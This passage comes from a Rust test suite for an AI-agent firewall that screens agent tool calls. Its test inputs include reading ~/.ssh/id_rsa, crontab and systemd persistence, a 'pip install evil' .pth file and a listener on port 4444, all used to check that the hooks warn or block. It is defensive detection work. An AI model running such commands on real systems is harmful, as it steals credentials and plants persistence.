        let output = post_bash(&input);
        assert_eq!(output.decision, HookDecision::Warn);
    }

    #[test]
    fn post_bash_multiple_warnings_combined() {
        // crontab + systemd in the same command
        let input = make_input("bash", json!({
            "command": "crontab -l",
            "stdout": "Created /home/user/.config/systemd/user/evil.service",
            "stderr": ""
        }));
        let output = post_bash(&input);
        assert_eq!(output.decision, HookDecision::Warn);
        let msg = output.message.as_deref().unwrap_or("");
        assert!(msg.contains("crontab"));
        assert!(msg.contains("systemd"));
    }

    #[test]
    fn post_bash_never_blocks() {
        // Even with every warning trigger, the decision should be Warn, never Block
        let input = make_input("bash", json!({
            "command": "pip install evil && crontab -e",
            "stdout": "evil.pth\n.config/systemd/user/x.service\nListening on 0.0.0.0:4444",
            "stderr": ""
        }));
        let output = post_bash(&input);
        assert_eq!(output.decision, HookDecision::Warn);
        assert_ne!(output.decision, HookDecision::Block);
    }

    #[test]
    fn post_bash_handles_missing_fields_gracefully() {
        // tool_input with no command, stdout, or stderr
        let input = make_input("bash", json!({}));
        let output = post_bash(&input);
        assert_eq!(output.decision, HookDecision::Allow);
    }

    // ---- Edge case tests: empty / missing / malformed tool_input ----

    #[test]
    fn pre_bash_allows_empty_tool_input() {
        // Empty object has no "command" key — pre_bash falls back to ""
        let input = make_input("bash", json!({}));
        let output = pre_bash(&input);
        assert_eq!(output.decision, HookDecision::Allow);
    }

    #[test]
    fn pre_write_allows_missing_file_path_and_content() {
        // Empty object has neither "file_path"/"path" nor "content"
        let input = make_input("write", json!({}));
        let output = pre_write(&input);
        assert_eq!(output.decision, HookDecision::Allow);
    }

    #[test]
    fn pre_read_blocks_path_key_ssh() {
        // pre_read falls back to "path" when "file_path" is absent
        let input = make_input("read", json!({"path": "~/.ssh/id_rsa"}));
        let output = pre_read(&input);
        assert_eq!(output.decision, HookDecision::Block);
    }

    #[test]
    fn pre_bash_allows_array_tool_input() {
        // Malformed tool_input (array instead of object) — should not panic,
        // .get("command") returns None on non-object Values so command becomes ""
        let input = make_input("bash", json!([]));
        let output = pre_bash(&input);
        assert_eq!(output.decision, HookDecision::Allow);
    }

    // ---- config flag tests ----

    fn disabled_hooks_config() -> sanctum_types::config::AiFirewallConfig {
        sanctum_types::config::AiFirewallConfig {
            claude_hooks: false,
            ..Default::default()
        }
    }

    #[test]
    fn test_hooks_disabled_by_config() {
        let mut input = bash_input("cat ~/.ssh/id_rsa");
        input.config = Some(disabled_hooks_config());
        let output = pre_bash(&input);
        assert_eq!(output.decision, HookDecision::Allow);
    }

    #[test]
    fn test_redaction_disabled_by_config() {
        let mut input = make_input(
            "write",
            json!({
                "file_path": "/tmp/config.yaml",
                "content": "api_key: sk-abcdefghijklmnopqrstuvwxyz"
            }),
        );
        input.config = Some(sanctum_types::config::AiFirewallConfig {
            redact_credentials: false,
            ..Default::default()
        });
        let output = pre_write(&input);
        assert_eq!(output.decision, HookDecision::Allow);
    }

    #[test]
    fn test_hooks_enabled_by_default() {
        // config: None means all checks are active (backward-compatible default)
        let input = bash_input("cat ~/.ssh/id_rsa");
        assert!(input.config.is_none());
        let output = pre_bash(&input);
        assert_eq!(output.decision, HookDecision::Block);
    }
}
